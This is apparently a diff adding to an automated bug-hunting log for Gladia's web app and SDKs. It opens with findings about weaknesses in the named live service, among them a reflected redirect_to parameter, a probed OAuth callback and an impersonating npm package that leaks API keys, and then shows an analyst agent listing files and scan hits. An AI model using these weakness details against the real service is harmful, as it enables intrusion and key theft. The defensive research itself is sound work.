@@ -22318,3 +22318,632 @@ All 3 pass: confidence ≥40, class not on REJECTED list, concrete verify_steps 
 [RISK] app.gladia.io: 72 — /dashboard + SPA catch-all (200, no auth) = client-side enforcement; /signin redirect_to reflects URL-encoded value into form action with 0 CSP form-action directives (reflection gap); /auth/google/callback 302→accounts.google.com OAuth 2.0 PKCE S256 with FIXED redirect_uri (prevents code/state theft); /auth/google/callback?code=fake123&state=abc → HTTP 500 generic SPA "Unexpected Server Error" (no detail leak); oauth2 state cookie HttpOnly+SameSite=Lax but no Secure flag — mitigated by HSTS preload (max-age=31536000; includeSubDomains; preload); server-side 302 gate intact on /apikeys,/transcriptions,/settings; return-to cookie tamper-reset confirmed
 
 [sdk] 93 — npm `gladia@0.1.3` at dist-tag latest impersonates official SDK (package.json "Official" vs README "Unofficial"); orphaned (repo+user alexisbouchez 404 = irrevocable takeover risk persists); src/client.ts:307 leaks raw `x-gladia-key` into wss:// URL query via `searchParams.append('x-gladia-key', this.apiKey)` + `new WebSocket(wsUrl.toString())` — key exposed in URL (logged by proxies/browser history/Referer); official `@gladiaio/sdk@1.1.0` uses secure POST /v2/live → token-from-response → wss?token=<uuid> flow; PyPI `gladiaio-sdk@1.0.5` clean/official — supply-chain exposure HIGH
+===== ANALYST laguna 2026-08-10 15:21:16 UTC =====
+[0m
+> build · laguna-s-2.1-free
+[0m
+[0m$ [0mls -la
+total 396
+drwxr-xr-x 11 runner runner   4096 Aug 10 15:14 .
+drwxr-xr-x  3 runner runner   4096 Aug 10 15:14 ..
+drwxr-xr-x  7 runner runner   4096 Aug 10 15:14 .git
+drwxr-xr-x  3 runner runner   4096 Aug 10 15:14 .github
+-rw-r--r--  1 runner runner    156 Aug 10 15:14 README.md
+-rw-r--r--  1 runner runner     39 Aug 10 15:14 analyst-out.txt
+-rw-r--r--  1 runner runner 150867 Aug 10 15:14 analyst-prompt.txt
+-rw-r--r--  1 runner runner 148102 Aug 10 15:14 ctx.txt
+drwxr-xr-x  2 runner runner   4096 Aug 10 15:14 inventory
+drwxr-xr-x  2 runner runner   4096 Aug 10 15:14 knowledge
+drwxr-xr-x  2 runner runner  12288 Aug 10 15:14 leads
+-rw-r--r--  1 runner runner  14620 Aug 10 15:14 probe-results.md
+drwxr-xr-x  2 runner runner   4096 Aug 10 15:14 reports
+drwxr-xr-x  4 runner runner   4096 Aug 10 15:14 reposcan-raw
+-rw-r--r--  1 runner runner   2187 Aug 10 15:14 scope.yml
+drwxr-xr-x  2 runner runner   4096 Aug 10 15:14 scripts
+-rw-r--r--  1 runner runner     33 Aug 10 15:14 state_bigpickle.json
+-rw-r--r--  1 runner runner     33 Aug 10 15:14 state_laguna.json
+-rw-r--r--  1 runner runner     33 Aug 10 15:14 state_ling3.json
+-rw-r--r--  1 runner runner     33 Aug 10 15:14 state_longcat.json
+-rw-r--r--  1 runner runner     33 Aug 10 15:14 state_nemotron3.json
+drwxr-xr-x  2 runner runner   4096 Aug 10 15:14 triage
+[0m
+[0m$ [0mls -la inventory/ reports/ leads/ triage/ 2>/dev/null
+inventory/:
+total 36
+drwxr-xr-x  2 runner runner  4096 Aug 10 15:14 .
+drwxr-xr-x 11 runner runner  4096 Aug 10 15:14 ..
+-rw-r--r--  1 runner runner 26388 Aug 10 15:14 gladia.md
+
+leads/:
+total 3888
+drwxr-xr-x  2 runner runner  12288 Aug 10 15:14 .
+drwxr-xr-x 11 runner runner   4096 Aug 10 15:14 ..
+-rw-r--r--  1 runner runner 440993 Aug 10 15:14 lead-bigpickle.md
+-rw-r--r--  1 runner runner 606661 Aug 10 15:14 lead-laguna.md
+-rw-r--r--  1 runner runner   3804 Aug 10 15:14 lead-ling3.md
+-rw-r--r--  1 runner runner  38143 Aug 10 15:14 lead-longcat.md
+-rw-r--r--  1 runner runner 500272 Aug 10 15:14 lead-nemotron3.md
+-rw-r--r--  1 runner runner  28327 Aug 10 15:14 reposcan-2026-08-07-18-33.md
+-rw-r--r--  1 runner runner   8024 Aug 10 15:14 reposcan-2026-08-07-18-53.md
+-rw-r--r--  1 runner runner   8961 Aug 10 15:14 reposcan-2026-08-07-19-26.md
+-rw-r--r--  1 runner runner  78572 Aug 10 15:14 reposcan-2026-08-07-19-31.md
+-rw-r--r--  1 runner runner   9684 Aug 10 15:14 reposcan-2026-08-07-20-02.md
+-rw-r--r--  1 runner runner   9765 Aug 10 15:14 reposcan-2026-08-07-20-06.md
+-rw-r--r--  1 runner runner  75509 Aug 10 15:14 reposcan-2026-08-07-20-57.md
+-rw-r--r--  1 runner runner   9522 Aug 10 15:14 reposcan-2026-08-07-21-07.md
+-rw-r--r--  1 runner runner   6985 Aug 10 15:14 reposcan-2026-08-07-21-51.md
+-rw-r--r--  1 runner runner   7172 Aug 10 15:14 reposcan-2026-08-07-22-03.md
+-rw-r--r--  1 runner runner  12043 Aug 10 15:14 reposcan-2026-08-07-22-31.md
+-rw-r--r--  1 runner runner   8476 Aug 10 15:14 reposcan-2026-08-07-23-02.md
+-rw-r--r--  1 runner runner   7227 Aug 10 15:14 reposcan-2026-08-07-23-16.md
+-rw-r--r--  1 runner runner  28098 Aug 10 15:14 reposcan-2026-08-07-23-52.md
+-rw-r--r--  1 runner runner   7425 Aug 10 15:14 reposcan-2026-08-07-23-55.md
+-rw-r--r--  1 runner runner  12064 Aug 10 15:14 reposcan-2026-08-08-00-44.md
+-rw-r--r--  1 runner runner   7986 Aug 10 15:14 reposcan-2026-08-08-00-46.md
+-rw-r--r--  1 runner runner  27382 Aug 10 15:14 reposcan-2026-08-08-02-49.md
+-rw-r--r--  1 runner runner   8356 Aug 10 15:14 reposcan-2026-08-08-03-04.md
+-rw-r--r--  1 runner runner   7304 Aug 10 15:14 reposcan-2026-08-08-04-05.md
+-rw-r--r--  1 runner runner   8356 Aug 10 15:14 reposcan-2026-08-08-05-13.md
+-rw-r--r--  1 runner runner   8409 Aug 10 15:14 reposcan-2026-08-08-06-03.md
+-rw-r--r--  1 runner runner  14418 Aug 10 15:14 reposcan-2026-08-08-06-11.md
+-rw-r--r--  1 runner runner   8356 Aug 10 15:14 reposcan-2026-08-08-07-12.md
+-rw-r--r--  1 runner runner   8580 Aug 10 15:14 reposcan-2026-08-08-07-28.md
+-rw-r--r--  1 runner runner   8356 Aug 10 15:14 reposcan-2026-08-08-08-07.md
+-rw-r--r--  1 runner runner   8356 Aug 10 15:14 reposcan-2026-08-08-08-59.md
+-rw-r--r--  1 runner runner   7604 Aug 10 15:14 reposcan-2026-08-08-09-07.md
+-rw-r--r--  1 runner runner   8356 Aug 10 15:14 reposcan-2026-08-08-09-49.md
+-rw-r--r--  1 runner runner   7262 Aug 10 15:14 reposcan-2026-08-08-10-02.md
+-rw-r--r--  1 runner runner   8411 Aug 10 15:14 reposcan-2026-08-08-10-21.md
+-rw-r--r--  1 runner runner   9600 Aug 10 15:14 reposcan-2026-08-08-10-33.md
+-rw-r--r--  1 runner runner  27382 Aug 10 15:14 reposcan-2026-08-08-11-01.md
+-rw-r--r--  1 runner runner  10290 Aug 10 15:14 reposcan-2026-08-08-11-19.md
+-rw-r--r--  1 runner runner   8662 Aug 10 15:14 reposcan-2026-08-08-11-42.md
+-rw-r--r--  1 runner runner   8044 Aug 10 15:14 reposcan-2026-08-08-11-53.md
+-rw-r--r--  1 runner runner   6629 Aug 10 15:14 reposcan-2026-08-08-12-05.md
+-rw-r--r--  1 runner runner  27382 Aug 10 15:14 reposcan-2026-08-08-12-22.md
+-rw-r--r--  1 runner runner  27382 Aug 10 15:14 reposcan-2026-08-08-13-16.md
+-rw-r--r--  1 runner runner   9675 Aug 10 15:14 reposcan-2026-08-08-13-25.md
+-rw-r--r--  1 runner runner   8784 Aug 10 15:14 reposcan-2026-08-08-14-04.md
+-rw-r--r--  1 runner runner   5827 Aug 10 15:14 reposcan-2026-08-08-14-06.md
+-rw-r--r--  1 runner runner  27965 Aug 10 15:14 reposcan-2026-08-08-14-53.md
+-rw-r--r--  1 runner runner   7350 Aug 10 15:14 reposcan-2026-08-08-14-57.md
+-rw-r--r--  1 runner runner  30447 Aug 10 15:14 reposcan-2026-08-08-15-20.md
+-rw-r--r--  1 runner runner   9212 Aug 10 15:14 reposcan-2026-08-08-15-24.md
+-rw-r--r--  1 runner runner   6602 Aug 10 15:14 reposcan-2026-08-08-15-53.md
+-rw-r--r--  1 runner runner   7489 Aug 10 15:14 reposcan-2026-08-08-15-54.md
+-rw-r--r--  1 runner runner   7497 Aug 10 15:14 reposcan-2026-08-08-16-54.md
+-rw-r--r--  1 runner runner   8256 Aug 10 15:14 reposcan-2026-08-08-17-10.md
+-rw-r--r--  1 runner runner   7537 Aug 10 15:14 reposcan-2026-08-08-17-30.md
+-rw-r--r--  1 runner runner  27382 Aug 10 15:14 reposcan-2026-08-08-17-55.md
+-rw-r--r--  1 runner runner   5821 Aug 10 15:14 reposcan-2026-08-08-18-00.md
+-rw-r--r--  1 runner runner   6816 Aug 10 15:14 reposcan-2026-08-08-18-20.md
+-rw-r--r--  1 runner runner  27382 Aug 10 15:14 reposcan-2026-08-08-18-52.md
+-rw-r--r--  1 runner runner   7054 Aug 10 15:14 reposcan-2026-08-08-19-08.md
+-rw-r--r--  1 runner runner  27131 Aug 10 15:14 reposcan-2026-08-08-19-30.md
+-rw-r--r--  1 runner runner   9467 Aug 10 15:14 reposcan-2026-08-08-19-46.md
+-rw-r--r--  1 runner runner   8356 Aug 10 15:14 reposcan-2026-08-08-20-03.md
+-rw-r--r--  1 runner runner   6737 Aug 10 15:14 reposcan-2026-08-08-20-14.md
+-rw-r--r--  1 runner runner   8356 Aug 10 15:14 reposcan-2026-08-08-20-31.md
+-rw-r--r--  1 runner runner   8762 Aug 10 15:14 reposcan-2026-08-08-20-52.md
+-rw-r--r--  1 runner runner   8356 Aug 10 15:14 reposcan-2026-08-08-21-03.md
+-rw-r--r--  1 runner runner  27381 Aug 10 15:14 reposcan-2026-08-08-21-21.md
+-rw-r--r--  1 runner runner   7872 Aug 10 15:14 reposcan-2026-08-08-21-47.md
+-rw-r--r--  1 runner runner  27610 Aug 10 15:14 reposcan-2026-08-08-21-54.md
+-rw-r--r--  1 runner runner   7642 Aug 10 15:14 reposcan-2026-08-08-22-26.md
+-rw-r--r--  1 runner runner  11379 Aug 10 15:14 reposcan-2026-08-08-22-28.md
+-rw-r--r--  1 runner runner  27382 Aug 10 15:14 reposcan-2026-08-08-23-00.md
+-rw-r--r--  1 runner runner  26885 Aug 10 15:14 reposcan-2026-08-08-23-39.md
+-rw-r--r--  1 runner runner   6380 Aug 10 15:14 reposcan-2026-08-09-00-05.md
+-rw-r--r--  1 runner runner  28494 Aug 10 15:14 reposcan-2026-08-09-02-29.md
+-rw-r--r--  1 runner runner  14401 Aug 10 15:14 reposcan-2026-08-09-04-03.md
+-rw-r--r--  1 runner runner   8639 Aug 10 15:14 reposcan-2026-08-09-05-19.md
+-rw-r--r--  1 runner runner   8541 Aug 10 15:14 reposcan-2026-08-09-06-06.md
+-rw-r--r--  1 runner runner  79446 Aug 10 15:14 reposcan-2026-08-09-06-09.md
+-rw-r--r--  1 runner runner   6133 Aug 10 15:14 reposcan-2026-08-09-07-17.md
+-rw-r--r--  1 runner runner   8300 Aug 10 15:14 reposcan-2026-08-09-08-09.md
+-rw-r--r--  1 runner runner   7946 Aug 10 15:14 reposcan-2026-08-09-09-04.md
+-rw-r--r--  1 runner runner  27400 Aug 10 15:14 reposcan-2026-08-09-09-55.md
+-rw-r--r--  1 runner runner  27610 Aug 10 15:14 reposcan-2026-08-09-09-58.md
+-rw-r--r--  1 runner runner   9192 Aug 10 15:14 reposcan-2026-08-09-10-31.md
+-rw-r--r--  1 runner runner   7230 Aug 10 15:14 reposcan-2026-08-09-10-38.md
+-rw-r--r--  1 runner runner   6487 Aug 10 15:14 reposcan-2026-08-09-11-10.md
+-rw-r--r--  1 runner runner   7854 Aug 10 15:14 reposcan-2026-08-09-11-46.md
+-rw-r--r--  1 runner runner   6024 Aug 10 15:14 reposcan-2026-08-09-12-17.md
+-rw-r--r--  1 runner runner   7839 Aug 10 15:14 reposcan-2026-08-09-12-19.md
+-rw-r--r--  1 runner runner   7712 Aug 10 15:14 reposcan-2026-08-09-13-33.md
+-rw-r--r--  1 runner runner   8882 Aug 10 15:14 reposcan-2026-08-09-14-16.md
+-rw-r--r--  1 runner runner  77508 Aug 10 15:14 reposcan-2026-08-09-14-23.md
+-rw-r--r--  1 runner runner   8689 Aug 10 15:14 reposcan-2026-08-09-15-02.md
+-rw-r--r--  1 runner runner   7849 Aug 10 15:14 reposcan-2026-08-09-15-35.md
+-rw-r--r--  1 runner runner   8080 Aug 10 15:14 reposcan-2026-08-09-15-48.md
+-rw-r--r--  1 runner runner   8373 Aug 10 15:14 reposcan-2026-08-09-16-07.md
+-rw-r--r--  1 runner runner   7541 Aug 10 15:14 reposcan-2026-08-09-16-35.md
+-rw-r--r--  1 runner runner  10447 Aug 10 15:14 reposcan-2026-08-09-16-55.md
+-rw-r--r--  1 runner runner  27381 Aug 10 15:14 reposcan-2026-08-09-17-16.md
+-rw-r--r--  1 runner runner   7883 Aug 10 15:14 reposcan-2026-08-09-17-27.md
+-rw-r--r--  1 runner runner  27448 Aug 10 15:14 reposcan-2026-08-09-17-52.md
+-rw-r--r--  1 runner runner   8455 Aug 10 15:14 reposcan-2026-08-09-18-07.md
+-rw-r--r--  1 runner runner  27382 Aug 10 15:14 reposcan-2026-08-09-18-38.md
+-rw-r--r--  1 runner runner  27448 Aug 10 15:14 reposcan-2026-08-09-18-59.md
+-rw-r--r--  1 runner runner   8249 Aug 10 15:14 reposcan-2026-08-09-19-22.md
+-rw-r--r--  1 runner runner  10364 Aug 10 15:14 reposcan-2026-08-09-19-45.md
+-rw-r--r--  1 runner runner   8634 Aug 10 15:14 reposcan-2026-08-09-19-58.md
+-rw-r--r--  1 runner runner  27382 Aug 10 15:14 reposcan-2026-08-09-20-07.md
+-rw-r--r--  1 runner runner   9349 Aug 10 15:14 reposcan-2026-08-09-20-40.md
+-rw-r--r--  1 runner runner   7800 Aug 10 15:14 reposcan-2026-08-09-20-53.md
+-rw-r--r--  1 runner runner   7117 Aug 10 15:14 reposcan-2026-08-09-21-15.md
+-rw-r--r--  1 runner runner  27448 Aug 10 15:14 reposcan-2026-08-09-21-40.md
+-rw-r--r--  1 runner runner   6483 Aug 10 15:14 reposcan-2026-08-09-21-50.md
+-rw-r--r--  1 runner runner   7453 Aug 10 15:14 reposcan-2026-08-09-22-03.md
+-rw-r--r--  1 runner runner   8738 Aug 10 15:14 reposcan-2026-08-09-22-30.md
+-rw-r--r--  1 runner runner   8713 Aug 10 15:14 reposcan-2026-08-09-22-44.md
+-rw-r--r--  1 runner runner  27904 Aug 10 15:14 reposcan-2026-08-09-23-03.md
+-rw-r--r--  1 runner runner   8356 Aug 10 15:14 reposcan-2026-08-09-23-09.md
+-rw-r--r--  1 runner runner   8541 Aug 10 15:14 reposcan-2026-08-09-23-47.md
+-rw-r--r--  1 runner runner  27382 Aug 10 15:14 reposcan-2026-08-10-00-42.md
+-rw-r--r--  1 runner runner   9436 Aug 10 15:14 reposcan-2026-08-10-01-42.md
+-rw-r--r--  1 runner runner   6733 Aug 10 15:14 reposcan-2026-08-10-03-08.md
+-rw-r--r--  1 runner runner   7669 Aug 10 15:14 reposcan-2026-08-10-03-32.md
+-rw-r--r--  1 runner runner   8356 Aug 10 15:14 reposcan-2026-08-10-04-52.md
+-rw-r--r--  1 runner runner  27382 Aug 10 15:14 reposcan-2026-08-10-05-13.md
+-rw-r--r--  1 runner runner   6726 Aug 10 15:14 reposcan-2026-08-10-06-25.md
+-rw-r--r--  1 runner runner   6981 Aug 10 15:14 reposcan-2026-08-10-06-43.md
+-rw-r--r--  1 runner runner  53466 Aug 10 15:14 reposcan-2026-08-10-08-09.md
+-rw-r--r--  1 runner runner   8442 Aug 10 15:14 reposcan-2026-08-10-08-18.md
+-rw-r--r--  1 runner runner   7031 Aug 10 15:14 reposcan-2026-08-10-09-51.md
+-rw-r--r--  1 runner runner   7337 Aug 10 15:14 reposcan-2026-08-10-09-59.md
+-rw-r--r--  1 runner runner  12443 Aug 10 15:14 reposcan-2026-08-10-10-57.md
+-rw-r--r--  1 runner runner   9378 Aug 10 15:14 reposcan-2026-08-10-11-13.md
+-rw-r--r--  1 runner runner  27382 Aug 10 15:14 reposcan-2026-08-10-11-49.md
+-rw-r--r--  1 runner runner   8085 Aug 10 15:14 reposcan-2026-08-10-12-03.md
+-rw-r--r--  1 runner runner  27382 Aug 10 15:14 reposcan-2026-08-10-12-44.md
+-rw-r--r--  1 runner runner  27382 Aug 10 15:14 reposcan-2026-08-10-13-37.md
+-rw-r--r--  1 runner runner  12311 Aug 10 15:14 reposcan-2026-08-10-14-11.md
+-rw-r--r--  1 runner runner  27650 Aug 10 15:14 reposcan-2026-08-10-14-47.md
+-rw-r--r--  1 runner runner  27650 Aug 10 15:14 reposcan-latest.md
+
+reports/:
+total 5124
+drwxr-xr-x  2 runner runner    4096 Aug 10 15:14 .
+drwxr-xr-x 11 runner runner    4096 Aug 10 15:14 ..
+-rw-r--r--  1 runner runner 1385913 Aug 10 15:14 analyst-bigpickle.log
+-rw-r--r--  1 runner runner 2572347 Aug 10 15:14 analyst-laguna.log
+-rw-r--r--  1 runner runner   17064 Aug 10 15:14 analyst-ling3.log
+-rw-r--r--  1 runner runner   58308 Aug 10 15:14 analyst-longcat.log
+-rw-r--r--  1 runner runner  900776 Aug 10 15:14 analyst-nemotron3.log
+-rw-r--r--  1 runner runner    1719 Aug 10 15:14 hypotheses-bigpickle.txt
+-rw-r--r--  1 runner runner   10945 Aug 10 15:14 hypotheses-laguna.txt
+-rw-r--r--  1 runner runner      47 Aug 10 15:14 hypotheses-ling3.txt
+-rw-r--r--  1 runner runner    5249 Aug 10 15:14 hypotheses-longcat.txt
+-rw-r--r--  1 runner runner    6656 Aug 10 15:14 hypotheses-nemotron3.txt
+-rw-r--r--  1 runner runner  222037 Aug 10 15:14 hypotheses.md
+-rw-r--r--  1 runner runner   25488 Aug 10 15:14 valid-bugs.md
+
+triage/:
+total 636
+drwxr-xr-x  2 runner runner  4096 Aug 10 15:14 .
+drwxr-xr-x 11 runner runner  4096 Aug 10 15:14 ..
+-rw-r--r--  1 runner runner   329 Aug 10 15:14 run-2026-08-07-19-18.md
+-rw-r--r--  1 runner runner 22882 Aug 10 15:14 run-2026-08-07-21-04.md
+-rw-r--r--  1 runner runner   299 Aug 10 15:14 run-2026-08-07-21-57.md
+-rw-r--r--  1 runner runner   315 Aug 10 15:14 run-2026-08-07-22-57.md
+-rw-r--r--  1 runner runner   241 Aug 10 15:14 run-2026-08-07-23-50.md
+-rw-r--r--  1 runner runner   467 Aug 10 15:14 run-2026-08-08-02-23.md
+-rw-r--r--  1 runner runner   437 Aug 10 15:14 run-2026-08-08-04-30.md
+-rw-r--r--  1 runner runner 14395 Aug 10 15:14 run-2026-08-08-06-01.md
+-rw-r--r--  1 runner runner 23300 Aug 10 15:14 run-2026-08-08-07-21.md
+-rw-r--r--  1 runner runner 17217 Aug 10 15:14 run-2026-08-08-09-05.md
+-rw-r--r--  1 runner runner  8395 Aug 10 15:14 run-2026-08-08-09-06.md
+-rw-r--r--  1 runner runner   430 Aug 10 15:14 run-2026-08-08-09-56.md
+-rw-r--r--  1 runner runner   245 Aug 10 15:14 run-2026-08-08-10-53.md
+-rw-r--r--  1 runner runner   268 Aug 10 15:14 run-2026-08-08-11-46.md
+-rw-r--r--  1 runner runner   294 Aug 10 15:14 run-2026-08-08-13-14.md
+-rw-r--r--  1 runner runner   389 Aug 10 15:14 run-2026-08-08-14-00.md
+-rw-r--r--  1 runner runner   292 Aug 10 15:14 run-2026-08-08-14-51.md
+-rw-r--r--  1 runner runner   284 Aug 10 15:14 run-2026-08-08-15-48.md
+-rw-r--r--  1 runner runner   326 Aug 10 15:14 run-2026-08-08-16-58.md
+-rw-r--r--  1 runner runner 20364 Aug 10 15:14 run-2026-08-08-17-56.md
+-rw-r--r--  1 runner runner   329 Aug 10 15:14 run-2026-08-08-18-35.md
+-rw-r--r--  1 runner runner   282 Aug 10 15:14 run-2026-08-08-19-19.md
+-rw-r--r--  1 runner runner 19044 Aug 10 15:14 run-2026-08-08-19-52.md
+-rw-r--r--  1 runner runner   239 Aug 10 15:14 run-2026-08-08-20-18.md
+-rw-r--r--  1 runner runner  5253 Aug 10 15:14 run-2026-08-08-20-56.md
+-rw-r--r--  1 runner runner   327 Aug 10 15:14 run-2026-08-08-21-52.md
+-rw-r--r--  1 runner runner 51999 Aug 10 15:14 run-2026-08-08-22-25.md
+-rw-r--r--  1 runner runner 14306 Aug 10 15:14 run-2026-08-08-23-17.md
+-rw-r--r--  1 runner runner   320 Aug 10 15:14 run-2026-08-08-23-50.md
+-rw-r--r--  1 runner runner   582 Aug 10 15:14 run-2026-08-09-01-01.md
+-rw-r--r--  1 runner runner 17365 Aug 10 15:14 run-2026-08-09-03-12.md
+-rw-r--r--  1 runner runner   317 Aug 10 15:14 run-2026-08-09-04-41.md
+-rw-r--r--  1 runner runner  6322 Aug 10 15:14 run-2026-08-09-05-39.md
+-rw-r--r--  1 runner runner   233 Aug 10 15:14 run-2026-08-09-06-32.md
+-rw-r--r--  1 runner runner   582 Aug 10 15:14 run-2026-08-09-07-42.md
+-rw-r--r--  1 runner runner 16984 Aug 10 15:14 run-2026-08-09-08-28.md
+-rw-r--r--  1 runner runner 23945 Aug 10 15:14 run-2026-08-09-09-28.md
+-rw-r--r--  1 runner runner   405 Aug 10 15:14 run-2026-08-09-10-19.md
+-rw-r--r--  1 runner runner   461 Aug 10 15:14 run-2026-08-09-10-59.md
+-rw-r--r--  1 runner runner 11647 Aug 10 15:14 run-2026-08-09-11-54.md
+-rw-r--r--  1 runner runner  6012 Aug 10 15:14 run-2026-08-09-12-39.md
+-rw-r--r--  1 runner runner   299 Aug 10 15:14 run-2026-08-09-13-39.md
+-rw-r--r--  1 runner runner  8912 Aug 10 15:14 run-2026-08-09-14-25.md
+-rw-r--r--  1 runner runner   405 Aug 10 15:14 run-2026-08-09-15-00.md
+-rw-r--r--  1 runner runner   269 Aug 10 15:14 run-2026-08-09-15-54.md
+-rw-r--r--  1 runner runner   275 Aug 10 15:14 run-2026-08-09-17-01.md
+-rw-r--r--  1 runner runner   299 Aug 10 15:14 run-2026-08-09-17-53.md
+-rw-r--r--  1 runner runner   410 Aug 10 15:14 run-2026-08-09-19-08.md
+-rw-r--r--  1 runner runner  6519 Aug 10 15:14 run-2026-08-09-19-54.md
+-rw-r--r--  1 runner runner   300 Aug 10 15:14 run-2026-08-09-20-29.md
+-rw-r--r--  1 runner runner   294 Aug 10 15:14 run-2026-08-09-21-18.md
+-rw-r--r--  1 runner runner 14854 Aug 10 15:14 run-2026-08-09-21-57.md
+-rw-r--r--  1 runner runner 20496 Aug 10 15:14 run-2026-08-09-22-57.md
+-rw-r--r--  1 runner runner   291 Aug 10 15:14 run-2026-08-09-23-54.md
+-rw-r--r--  1 runner runner   392 Aug 10 15:14 run-2026-08-10-02-39.md
+-rw-r--r--  1 runner runner   299 Aug 10 15:14 run-2026-08-10-04-19.md
+-rw-r--r--  1 runner runner   367 Aug 10 15:14 run-2026-08-10-05-52.md
+-rw-r--r--  1 runner runner 18270 Aug 10 15:14 run-2026-08-10-07-30.md
+-rw-r--r--  1 runner runner   321 Aug 10 15:14 run-2026-08-10-09-03.md
+-rw-r--r--  1 runner runner 30609 Aug 10 15:14 run-2026-08-10-10-45.md
+-rw-r--r--  1 runner runner   352 Aug 10 15:14 run-2026-08-10-11-38.md
+-rw-r--r--  1 runner runner 15806 Aug 10 15:14 run-2026-08-10-12-38.md
+-rw-r--r--  1 runner runner   313 Aug 10 15:14 run-2026-08-10-14-09.md
+-rw-r--r--  1 runner runner 13831 Aug 10 15:14 triage-report-2026-08-08.md
+-rw-r--r--  1 runner runner 16520 Aug 10 15:14 triage-report-2026-08-10.md
+[0m
+[0m$ [0mgit log --oneline -5
+c42b66f reposcan 2026-08-10-14-47
+[0m
+[0m$ [0mhead -200 reposcan-latest.md
+head: cannot open 'reposcan-latest.md' for reading: No such file or directory
+[0m
+[0m$ [0mwc -l inventory/gladia.md
+320 inventory/gladia.md
+[0m
+[0m$ [0mls -t leads/reposcan-*.md | head -3
+leads/reposcan-2026-08-10-12-03.md
+leads/reposcan-2026-08-10-12-44.md
+leads/reposcan-2026-08-10-13-37.md
+[0m
+[0m$ [0mhead -100 leads/reposcan-latest.md
+===== REPOSCAN 2026-08-10 14:47:24 UTC =====
+## Grep hits:
+SCAN SUMMARY: 5647 code/config files scanned, 617 hits
+reposcan-raw/npm/gladia.json:1: {"_id":"gladia","_rev":"4-d0214ef116ff0426b738c29cf2a97cf1","name":"gladia","dist-tags":{"latest":"0.1.3"},"versions":{"0.1.0":{"name":"gladia","version":"0.1.0","keywords":["gladia","speech-to-text","transcription","aud
+reposcan-raw/npm/_gladiaio_sdk.json:1: {"_id":"@gladiaio/sdk","_rev":"129-8d16ae11f6d0f01320400f5fcaa4e9e8","name":"@gladiaio/sdk","dist-tags":{"latest":"1.1.0"},"versions":{"0.1.0":{"name":"@gladiaio/sdk","version":"0.1.0","keywords":["gladia","sdk","typescr
+reposcan-raw/gladiaio/gladia-quiz-app/package-lock.json:11: "@gladiaio/sdk": "^0.6.0",
+reposcan-raw/gladiaio/gladia-quiz-app/package.json:24: "@gladiaio/sdk": "^0.6.0",
+reposcan-raw/gladiaio/gladia-quiz-app/hooks/useGladiaTranscription.ts:5: import { createGladiaClient, getStoredApiKey } from '../lib/gladia-client';
+reposcan-raw/gladiaio/gladia-quiz-app/hooks/useGladiaTranscription.ts:70: const gladia = createGladiaClient(apiKey);
+reposcan-raw/gladiaio/gladia-quiz-app/hooks/useGladiaTranscription.ts:74: const liveSession = gladia.liveV2().startSession({
+reposcan-raw/gladiaio/gladia-quiz-app/lib/gladia-client.ts:1: export const GLADIA_API_KEY_STORAGE = 'gladia_api_key';
+reposcan-raw/gladiaio/gladia-quiz-app/app/layout.tsx:7: metadataBase: new URL('https://gladia-halloween-quiz.vercel.app'),
+reposcan-raw/gladiaio/gladia-quiz-app/app/layout.tsx:43: src="https://unpkg.com/@gladiaio/sdk@0.5.2"
+reposcan-raw/gladiaio/gladia-quiz-app/components/HalloweenQuiz.tsx:47: const [gladiaApiKey, setGladiaApiKey] = useState<string | null>(null);
+reposcan-raw/gladiaio/gladia-quiz-app/components/HalloweenQuiz.tsx:56: const stored = localStorage.getItem('gladia_api_key');
+reposcan-raw/gladiaio/gladia-quiz-app/components/GladiaApiKeyInput.tsx:9: import { GLADIA_API_KEY_STORAGE } from '../lib/gladia-client';
+reposcan-raw/gladiaio/gladia-quiz-app/components/GladiaApiKeyInput.tsx:94: href="https://app.gladia.io"
+reposcan-raw/gladiaio/gladiaflow/package-lock.json:2: "name": "gladiaflow",
+reposcan-raw/gladiaio/gladiaflow/package-lock.json:8: "name": "gladiaflow",
+reposcan-raw/gladiaio/gladiaflow/package.json:2: "name": "gladiaflow",
+reposcan-raw/gladiaio/gladiaflow/src/main.tsx:4: import "./gladia-tokens.css";
+reposcan-raw/gladiaio/gladiaflow/src/App.tsx:264: invoke("close_gladia_session").catch(console.error);
+reposcan-raw/gladiaio/gladiaflow/src/App.tsx:274: invoke("close_gladia_session").catch(console.error);
+reposcan-raw/gladiaio/gladiaflow/src/App.tsx:284: invoke("close_gladia_session").catch(console.error);
+reposcan-raw/gladiaio/gladiaflow/src/screenshots/Gallery.tsx:17: apiKey: "sk-********",
+reposcan-raw/gladiaio/gladiaflow/src/screenshots/main.tsx:3: import "../gladia-tokens.css";
+reposcan-raw/gladiaio/gladiaflow/src/lib/dictationStats.ts:11: export const DICTATION_STATS_STORAGE_KEY = "gladiaflow.dictation.stats.v1";
+reposcan-raw/gladiaio/gladiaflow/src/lib/vocabularyEditor.test.ts:21: expect(validateVocabularyTerm(entries, " gladiaflow ", null)).toBe(
+reposcan-raw/gladiaio/gladiaflow/src/lib/vocabularyEditor.test.ts:27: expect(validateVocabularyTerm(entries, "gladiaflow", 0)).toBeNull();
+reposcan-raw/gladiaio/gladiaflow/src/lib/vocabularyEditor.test.ts:34: normalizePronunciationCandidate(["gladioflow"], " gladiaflaw "),
+reposcan-raw/gladiaio/gladiaflow/src/lib/customVocabulary.ts:8: value: "gladiaflow",
+reposcan-raw/gladiaio/gladiaflow/src/lib/customVocabulary.ts:9: pronunciations: ["gladioflow", "gladiaflaw"],
+reposcan-raw/gladiaio/gladiaflow/src/components/CustomVocabularyView.tsx:14: "https://docs.gladia.io/chapters/audio-intelligence/custom-vocabulary";
+reposcan-raw/gladiaio/gladiaflow/src/components/TranscriptionHistory.tsx:19: return `https://app.gladia.io/transcriptions/live/${sessionId}`;
+reposcan-raw/gladiaio/gladiaflow/src/components/ApiKeyOnboardingView.tsx:4: const API_KEYS_URL = "https://app.gladia.io/apikeys";
+reposcan-raw/gladiaio/gladiaflow/src-tauri/tauri.dev.conf.json:3: "identifier": "io.gladia.gladiaflow.dev",
+reposcan-raw/gladiaio/gladiaflow/src-tauri/tauri.conf.json:5: "identifier": "io.gladia.gladiaflow",
+reposcan-raw/gladiaio/gladiaflow/src-tauri/Cargo.toml:2: name = "gladiaflow"
+reposcan-raw/gladiaio/gladiaflow/src-tauri/Cargo.toml:5: authors = ["Gladia <support@gladia.io>"]
+reposcan-raw/gladiaio/compare-stt/test-providers.ts:8: const SLUGS = ["gladia", "deepgram", "assemblyai", "elevenlabs", "speechmatics", "mistral"];
+reposcan-raw/gladiaio/compare-stt/next.config.ts:38: destination: "https://www.gladia.io/compare-stt-apis",
